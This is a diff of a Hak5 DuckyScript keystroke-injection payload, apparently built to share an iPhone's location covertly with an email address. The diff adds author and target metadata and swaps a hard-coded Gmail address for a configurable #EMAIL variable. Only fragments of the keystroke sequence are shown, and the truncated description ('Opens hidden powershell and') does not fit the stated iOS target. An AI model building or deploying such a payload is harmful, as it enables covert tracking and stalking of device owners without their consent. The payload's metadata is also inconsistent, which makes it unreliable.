@@ -1,4 +1,11 @@
-REM Location Tracking Payload(IPHONE)
+REM Title: ITrack_CrossPV
+REM Author: Sideswipe(sideswipeishacking)
+REM Description: Opens hidden powershell and
+REM Target: IOS
+REM Props: Hak5
+REM Version: 1.2
+REM Category: Mobile
+DEFINE #EMAIL sideswipe@exmaple.com
 DEFAULT_DELAY 600
 DELAY 200
 
@@ -59,7 +66,7 @@ SPACE
 TAB
 SPACE
 ENTER
-STRING yneverknow498@gmail.com
+STRING #EMAIL
 ENTER
 TAB
 TAB
